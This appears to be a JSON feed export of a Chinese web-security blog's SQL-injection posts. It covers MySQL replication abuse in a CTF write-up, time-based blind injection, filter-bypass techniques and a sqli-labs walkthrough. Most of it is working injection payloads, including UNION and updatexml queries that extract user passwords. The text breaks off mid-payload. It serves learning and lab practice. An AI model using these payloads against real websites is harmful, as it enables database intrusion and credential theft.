{
    "version": "https://jsonfeed.org/version/1",
    "title": "welcome to my blog • All posts by \"sql注入\" category",
    "description": "不定时更新web安全相关知识",
    "home_page_url": "https://hq185187.github.io",
    "items": [
        {
            "id": "https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/",
            "url": "https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/",
            "title": "Mysql主从复制",
            "date_published": "2023-06-21T03:09:09.169Z",
            "content_html": "<h2 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h2>\n<p>简单说就是主服务器上执行的语句，从服务器也执行了相同的语句，主服务器的操作在从服务器上产生了相同的效果</p>\n<p>过程：</p>\n<ul>\n<li>master（主数据库）将用户对数据库的更新操作以二进制格式保存进 BinaryLog 日志文件中</li>\n<li>slave (从数据库) 的 I/O 进程读取主数据库的二进制日志文件</li>\n<li>slave 将接收到的日志内容添加到 relay-kog，从数据库的 SQL 进程检测新的日志内容解析并执行</li>\n</ul>\n<p><img data-src=\"https://img-blog.csdnimg.cn/20201102143527123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNzg2Mjg1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"图片\"></p>\n<h2 id=\"配置\"><a class=\"markdownIt-Anchor\" href=\"#配置\">#</a> 配置</h2>\n<p>master：192.168.81.122(kali)<br>\nslave：192.168.81.113(ubuntu)</p>\n<h3 id=\"master配置\"><a class=\"markdownIt-Anchor\" href=\"#master配置\">#</a> Master 配置：</h3>\n<p>命令行进入 MySQL:<br>\n <code> mysql -u root -p</code> <br>\n 接着输入密码，然后创建用户：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//root和root是从服务器器(slave)的数据库用户名和密码</span><br><span class=\"line\">GRANT REPLICATION SLAVE ON *.* to &#x27;root&#x27;@&#x27;192.168.81.113&#x27; identified by &#x27;root&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//刷新系统权限表的配置</span><br><span class=\"line\">flush privileges;</span><br></pre></td></tr></table></figure>\n<p>找到 mysql 的配置文件 /etc/my.conf, 增加以下配置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#开启binlog</span><br><span class=\"line\">log-bin=mysql-bin</span><br><span class=\"line\">server-id=1</span><br><span class=\"line\">#需要同步的数据库,如果不配置则同步所以数据库</span><br><span class=\"line\">binlog-do-db=mysql_test</span><br><span class=\"line\">#binlog日志保留的天数</span><br><span class=\"line\">expire-logs-days=10</span><br></pre></td></tr></table></figure>\n<p>配置完成后重启 mysql:<br>\nservice mysql restart<br>\n 查看当前 binlog 日志的信息<br>\n <code>show master status\\G</code></p>\n<p>mysql-bin.000002</p>\n<h3 id=\"slave配置\"><a class=\"markdownIt-Anchor\" href=\"#slave配置\">#</a> slave 配置</h3>\n<p>找到 /etc/my.cnf 配置文件，增加以下配置:<br>\n <code>server-id=2</code> <br>\n 接着用命令行登录到 mysql 服务器:<br>\n <code>mysql -u root -p</code> <br>\n 进入 MySQL 后输入以下命令:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CHANGE MASTER TO </span><br><span class=\"line\">MASTER_HOST=&#x27;192.168.81.122&#x27;,//主机IP</span><br><span class=\"line\">MASTER_USER=&#x27;root&#x27;,//之前创建的用户账号</span><br><span class=\"line\">MASTER_PASSWORD=&#x27;root&#x27;,//之前创建的用户密码</span><br><span class=\"line\">MASTER_LOG_FILE=&#x27;mysql-bin.000002&#x27;,//master主机的binlog日志名称</span><br><span class=\"line\">MASTER_LOG_POS=862,//binlog日志偏移量</span><br><span class=\"line\">master_port=3306;//端口</span><br></pre></td></tr></table></figure>\n<p>启动 slave 服务:<br>\n <code>start slave;</code> <br>\n 查看是否启动成功:<br>\n <code>show slave status\\G</code></p>\n<h2 id=\"测试主从复制\"><a class=\"markdownIt-Anchor\" href=\"#测试主从复制\">#</a> 测试主从复制</h2>\n<p>在 maser 主机执行:</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE TABLE `tb_commodity_info` (</span><br><span class=\"line\">  `id` varchar(32) NOT NULL,</span><br><span class=\"line\">  `commodity_name` varchar(512) DEFAULT NULL COMMENT &#x27;商品名称&#x27;,</span><br><span class=\"line\">  `commodity_price` varchar(36) DEFAULT &#x27;0&#x27; COMMENT &#x27;商品价格&#x27;,</span><br><span class=\"line\">  `number` int(10) DEFAULT &#x27;0&#x27; COMMENT &#x27;商品数量&#x27;,</span><br><span class=\"line\">  `description` varchar(2048) DEFAULT &#x27;&#x27; COMMENT &#x27;商品描述&#x27;,</span><br><span class=\"line\">  PRIMARY KEY (`id`)</span><br><span class=\"line\">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=&#x27;商品信息表&#x27;;</span><br></pre></td></tr></table></figure>\n<p>此时看从数据库的结构</p>\n<h2 id=\"例题2023安洵杯-confronting-robots\"><a class=\"markdownIt-Anchor\" href=\"#例题2023安洵杯-confronting-robots\">#</a> 例题：2023 安洵杯 Confronting robots</h2>\n<p>前面都能用 sqlmap 扫出来直接到最后一步主从复制<br>\n查看数据库版本：<br>\nselect version();<br>\n 在自己 vps 上起一个相同版本的 mariadb，修改默认配置文件 vim /etc/mysql/my.cnf 允许远程访问并启用二进制日志<br>\n server-id = 1 log_bin = /var/log/mysql/mariadb-bin<br>\nservice mysql restart<br>\n 自己的 vps 作为主，题目环境作为从<br>\n主服务器执行<br>\n CREATE USER ‘atest’@’%’ IDENTIFIED BY ‘testtest’;<br>\ngrant replication slave on . to ‘atest’@’%’;<br>\nflush privileges; 使用 select database (); show tables; desc game; 等查询命令将从服务器上的数据库结构一比一复刻到<br>\n主服务器上 CREATE DATABASE IF NOT EXISTS game_data;<br>\nuse game_data<br>\nCREATE TABLE IF NOT EXISTS game ( round int(20) , choice varchar(256) ) ;<br>\n 在主服务器 mysql 中执行 show master status; 记录下来 File 和 Position mysql-bin.000001 1376<br>\n 在从服务器 (题目环境) 命令框中输入<br>\n CHANGE MASTER TO MASTER_HOST=‘主服务器 ip’, MASTER_USER=‘atest’,<br>\nMASTER_PASSWORD=‘testtest’, MASTER_LOG_FILE=‘mariadb-bin.000001 (记录的值)’,MASTER_LOG_POS=1365 (记录的值);<br>\nstart slave;<br>\nshow slave status;<br>\n 显示这个表示成功连接上<br>\n主服务器中执行<br>\n INSERT INTO game (round , choice) VALUES (‘1’, ‘R’), (‘2’, ‘R’),(‘3’, ‘R’), (‘4’, ‘R’),(‘5’, ‘R’), (‘6’, ‘R’),(‘7’,‘R’), (‘8’, ‘R’),(‘9’, ‘R’), (‘10’, ‘R’);</p>\n<p>在开始挑战处输入对应的答案得到 flag</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "url": "https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "title": "时间盲注",
            "date_published": "2023-05-07T07:33:27.765Z",
            "content_html": "<p>例子的表:</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">name</th>\n<th style=\"text-align:center\">url</th>\n<th style=\"text-align:center\">alexa</th>\n<th style=\"text-align:center\">country</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">Google</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNtLw==\">https://www.google.cm/</span></td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">USA</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">淘宝</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGFvYmFvLmNvbS8=\">https://www.taobao.com/</span></td>\n<td style=\"text-align:center\">13</td>\n<td style=\"text-align:center\">CN</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">菜鸟教程</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ydW5vb2IuY29tLw==\">http://www.runoob.com/</span></td>\n<td style=\"text-align:center\">10</td>\n<td style=\"text-align:center\">CN</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">4</td>\n<td style=\"text-align:center\">微博</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cDovL3dlaWJvLmNvbS8=\">http://weibo.com/</span></td>\n<td style=\"text-align:center\">20</td>\n<td style=\"text-align:center\">CN</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">5</td>\n<td style=\"text-align:center\">Facebook</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLw==\">https://www.facebook.com/</span></td>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">USA</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">7</td>\n<td style=\"text-align:center\">stackoverflow</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tLw==\">http://stackoverflow.com/</span></td>\n<td style=\"text-align:center\">0</td>\n<td style=\"text-align:center\">IND</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"基本延时的盲注sleep\"><a class=\"markdownIt-Anchor\" href=\"#基本延时的盲注sleep\">#</a> 基本延时的盲注:sleep</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from 表名 where id=1 and sleep(2);</span><br></pre></td></tr></table></figure>\n<p>配合 if 语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(expr1,expr2,expr3)</span><br><span class=\"line\">expr1是真,返回expr2,否则expr3</span><br><span class=\"line\">select * from websites where name=&#x27;1&#x27; or if(name=&#x27;Facebook&#x27;,sleep(2),null);</span><br><span class=\"line\">判断是否有网站名字为Facebook</span><br></pre></td></tr></table></figure>\n<p>配合截取函数<br>\n substr (string,start,length)<br>\nmid(string,start,length)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from websites where name=&#x27;2&#x27; or if(substr((select name from websites where id=1),0,1)=&#x27;G&#x27;,sleep(2),0);</span><br></pre></td></tr></table></figure>\n<h3 id=\"1benchmark\"><a class=\"markdownIt-Anchor\" href=\"#1benchmark\">#</a> 1.benchmark()</h3>\n<p>benchmark 是 MySQL 的一个内置函数，作用是测试一些函数的执行速度.benchmark 中有两个参数，第一个是执行的次数，第二个是要执行的函数或者表达式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select benchmark(10000,md5(&#x27;a&#x27;));</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">| benchmark(10000,md5(&#x27;a&#x27;)) |</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">|                         0 |</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">1 row in set (0.01 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select benchmark(100000000,md5(&#x27;a&#x27;));</span><br><span class=\"line\">+-------------------------------+</span><br><span class=\"line\">| benchmark(100000000,md5(&#x27;a&#x27;)) |</span><br><span class=\"line\">+-------------------------------+</span><br><span class=\"line\">|                             0 |</span><br><span class=\"line\">+-------------------------------+</span><br><span class=\"line\">1 row in set (14.29 sec)</span><br></pre></td></tr></table></figure>\n<p>可以看到执行次数不同，时间也不同，我们接下来用它来达到 sleep 的延时目的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 1 and if((substr(user(),1,1)=&#x27;r&#x27;),BENCHMARK(10000000,md5(&#x27;a&#x27;)),1);</span><br></pre></td></tr></table></figure>\n<h3 id=\"2heavy-query\"><a class=\"markdownIt-Anchor\" href=\"#2heavy-query\">#</a> 2.heavy query</h3>\n<p>通过大量的查询导致查询时间变长来达到延时目的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*) from information_schema.tables A,information_schema.tables B;</span><br><span class=\"line\"></span><br><span class=\"line\">select 1 and if((substr(user(),1,1)=&#x27;r&#x27;),(select count(*) from information_schema.tables A,information_schema.tables B;),1);</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/",
            "url": "https://hq185187.github.io/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/",
            "title": "SQL注入绕过",
            "date_published": "2023-04-28T17:31:47.527Z",
            "content_html": "<h1 id=\"一字符替换\"><a class=\"markdownIt-Anchor\" href=\"#一字符替换\">#</a> 一。字符替换</h1>\n<h3 id=\"1过滤空格\"><a class=\"markdownIt-Anchor\" href=\"#1过滤空格\">#</a> 1. 过滤空格</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%0a,%0b,%0c,%0d,%09,%a0(只在特定字符集才能利用),/**/,括号等</span><br></pre></td></tr></table></figure>\n<h3 id=\"2select替换成空\"><a class=\"markdownIt-Anchor\" href=\"#2select替换成空\">#</a> 2.select 替换成空</h3>\n<p>双写 selectselect</p>\n<h3 id=\"3大小写绕过\"><a class=\"markdownIt-Anchor\" href=\"#3大小写绕过\">#</a> 3. 大小写绕过</h3>\n<p>MySQL 中是不区分大小写的，若是过滤了 SELECT, 就用 select 绕过，其他同理</p>\n<h3 id=\"4正则匹配\"><a class=\"markdownIt-Anchor\" href=\"#4正则匹配\">#</a> 4. 正则匹配</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">正则匹配\\bselect\\b可以用形如/*!50000*/方法绕过</span><br><span class=\"line\">/*!50000*/是一种特殊的注释,里面的SQL会被执行,50000是一个版本号,假设MySQL版本大于这个版本号就执行里面的SQL语句</span><br></pre></td></tr></table></figure>\n<h3 id=\"5替换了单引号或双引号忘记了反斜杠\"><a class=\"markdownIt-Anchor\" href=\"#5替换了单引号或双引号忘记了反斜杠\">#</a> 5. 替换了单引号或双引号，忘记了反斜杠</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM wp_news WHERE id=&#x27;可控点1&#x27; AND title=&#x27;可控点2&#x27;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM wp_news WHERE id=&#x27;a\\&#x27; AND title=&#x27;OR sleep(1)#&#x27;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>第一个可控点的反斜杠转义可控点 1 预置的单引号，导致可控点 2 逃逸出单引号<br>\n eg</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> websites <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"string\">&#x27;a\\&#x27;</span> <span class=\"keyword\">and</span> url<span class=\"operator\">=</span><span class=\"string\">&#x27;union select 1,2,(select concat(id,0x7e,url)from websites limit 1)#&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"二逃逸引号\"><a class=\"markdownIt-Anchor\" href=\"#二逃逸引号\">#</a> 二。逃逸引号</h3>\n<p>注入的重点是逃逸引号，但开发者往往会做一次 addslashes (转义单双引号，反斜杠), 怎么绕过</p>\n<h3 id=\"1编码解码\"><a class=\"markdownIt-Anchor\" href=\"#1编码解码\">#</a> 1. 编码解码</h3>\n<p>宽字节注入，稍后说</p>\n<h3 id=\"2意料之外的注入点\"><a class=\"markdownIt-Anchor\" href=\"#2意料之外的注入点\">#</a> 2. 意料之外的注入点</h3>\n<p>开发者在转义用户输入时遗漏了一些可注入点.PHP: 文件的上传名，http header,$SERVER [‘PHP_SELF’] 这些变量，稍后举例</p>\n<h3 id=\"3二次注入\"><a class=\"markdownIt-Anchor\" href=\"#3二次注入\">#</a> 3. 二次注入</h3>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">username</th>\n<th style=\"text-align:center\">password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">admin</td>\n<td style=\"text-align:center\">password</td>\n</tr>\n</tbody>\n</table>\n<p>假设一个表如上图，用户输入:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> wp_user <span class=\"keyword\">values</span>(<span class=\"number\">2</span>,<span class=\"string\">&#x27;admin\\&#x27;</span><span class=\"keyword\">or</span>\\<span class=\"string\">&#x27;1&#x27;</span>,<span class=\"string\">&#x27;some pass&#x27;</span>);</span><br></pre></td></tr></table></figure>\n<p>此时库的内容是:</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">username</th>\n<th style=\"text-align:center\">password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">admin’or’1</td>\n<td style=\"text-align:center\">somepass</td>\n</tr>\n</tbody>\n</table>\n<p>引号被转义，正常入库，但是当这个用户名被再次使用时</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$res</span>=<span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$conn</span>,<span class=\"string\">&quot;SELECT password from wp_user where username=&#x27;<span class=\"subst\">$name</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>此时 SQL 语句为</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> password <span class=\"keyword\">from</span> wp_user <span class=\"keyword\">where</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span><span class=\"keyword\">or</span><span class=\"string\">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p>此时产生注入</p>\n<h3 id=\"4字符串截断\"><a class=\"markdownIt-Anchor\" href=\"#4字符串截断\">#</a> 4. 字符串截断</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$title</span>=<span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$title</span>=<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$title</span>,<span class=\"number\">0</span>,<span class=\"number\">10</span>);</span><br><span class=\"line\"><span class=\"variable\">$content</span>=<span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;INSERT INTO wp_news VALUES(2,&#x27;<span class=\"subst\">$title</span>&#x27;,&#x27;<span class=\"subst\">$content</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>\n<p>假如输入 aaaaaaaaa’,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">自动转义为aaaaaaaaa\\&#x27;,由于字符串长度限制被截取为aaaaaaaaa\\,转义了预置的单引号,就能注入了</span><br><span class=\"line\">?title=aaaaaaaaa&#x27;&amp;content=,1,1),(3,4,(select pwd from wp_user limit 1),1)#</span><br></pre></td></tr></table></figure>\n<p>sql 语句是</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">values</span>(<span class=\"number\">2</span>,<span class=\"string\">&#x27;aaaaaaaaa&#x27;</span>,<span class=\"string\">&#x27;,1,1),(3,4,(select pwd from wp_user limit 1),1)#&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>此时表</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">title</th>\n<th style=\"text-align:center\">content</th>\n<th style=\"text-align:center\">time</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">this is title</td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">aaaaaaaaa’,</td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">4</td>\n<td style=\"text-align:center\">admin_password</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n</tbody>\n</table>\n<p>可发现新加了两行，成功注入</p>\n<p>mid () 函数<br>\n select mid (column_name,start,length)<br>\n right () 函数<br>\n从指定字符串的<mark>右侧</mark>提取给定长度的字符<br>\n select right (column_name,length)<br>\n substr () 函数<br>\n与 mid () 一样<br>\n reverse () 函数<br>\n反转字符串</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/28/sqli-labs/",
            "url": "https://hq185187.github.io/2023/04/28/sqli-labs/",
            "title": "Sqli-labs靶场通关",
            "date_published": "2023-04-28T07:34:52.582Z",
            "content_html": "<h3 id=\"怎么判断字符型或者数字型\"><a class=\"markdownIt-Anchor\" href=\"#怎么判断字符型或者数字型\">#</a> 怎么判断字符型或者数字型？</h3>\n<p>数字型:id=2 和 id=3-1 返回界面相同<br>\n原理：说明 3-1 被解析了，旁边没有引号<br>\n字符型:id=2 和 id=2a 页面一样就行<br>\n原理：MySQL 等号两边类型不一致会发生强制转换，字符串 -&gt; 数字</p>\n<p>group_concat 是用，连接多行记录的函数</p>\n<h2 id=\"less1\"><a class=\"markdownIt-Anchor\" href=\"#less1\">#</a> less1</h2>\n<p>字符型注入<br>\n看源码:sql=“SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>\n<p>因此:<mark>payload:1’   操作   --+</mark></p>\n<p>?id=1’ order by 3–+<br>\n?id=1’ order by 4–+<br>\n?id=-1’ union select 1,2,3–+// 判断回显位<br>\n？id=-1’ union select 1,2,database ()–+<br>\n?id=-1’ union select1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p>\n<p>?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’ and table_schema=database()–+</p>\n<p>?id=-1’ union select 1,group_concat(username),group_concat(password) from users–+</p>\n<h2 id=\"less2\"><a class=\"markdownIt-Anchor\" href=\"#less2\">#</a> less2</h2>\n<p>数字型<br>\n看源码:sql=“SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br>\n 直接输入数字就好，解法与 less1 相同，去掉 less1 的’和–+ 即可</p>\n<h2 id=\"less3\"><a class=\"markdownIt-Anchor\" href=\"#less3\">#</a> less3</h2>\n<p>id=1’)–+</p>\n<h2 id=\"less4\"><a class=\"markdownIt-Anchor\" href=\"#less4\">#</a> less4</h2>\n<p>id=1&quot;)–+</p>\n<h2 id=\"less5-报错注入\"><a class=\"markdownIt-Anchor\" href=\"#less5-报错注入\">#</a> less5 报错注入</h2>\n<h3 id=\"1updatexml函数\"><a class=\"markdownIt-Anchor\" href=\"#1updatexml函数\">#</a> 1.updatexml 函数</h3>\n<p>updatexml(xml_doument,XPath_string,new_value)<br>\n 第一个参数：XML 的内容<br>\n第二个参数：是需要 update 的位置 XPATH 路径<br>\n第三个参数：是更新后的内容<br>\n所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式，不对就爆出正确内容<br>\n可以校验的：0x7e (~),0x5e24 (^$),’#’(#)<br>\npayload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,database()),1)--+暴当前数据库</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1)--+</span><br><span class=\"line\">此时会出现Subquery returns more than 1 row</span><br></pre></td></tr></table></figure>\n<h4 id=\"1可以用limit解决limit-01-11-21-31\"><a class=\"markdownIt-Anchor\" href=\"#1可以用limit解决limit-01-11-21-31\">#</a> 1. 可以用 limit 解决，limit 0,1 1,1 2,1 3,1</h4>\n<p>limit (a,b): 从 a 开始往后看 b 个内容</p>\n<p>在 limit 3,1 找到 users 表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()limit 3,1)),1)--+</span><br></pre></td></tr></table></figure>\n<p>后面同理爆字段</p>\n<h4 id=\"2加个group_concat解决\"><a class=\"markdownIt-Anchor\" href=\"#2加个group_concat解决\">#</a> 2. 加个 group_concat 解决</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+</span><br><span class=\"line\">过程同上</span><br><span class=\"line\"></span><br><span class=\"line\">最后</span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)--+</span><br></pre></td></tr></table></figure>\n<h4 id=\"3substr方法\"><a class=\"markdownIt-Anchor\" href=\"#3substr方法\">#</a> 3.substr 方法</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+</span><br><span class=\"line\">最后:</span><br><span class=\"line\">?id=1&#x27; and 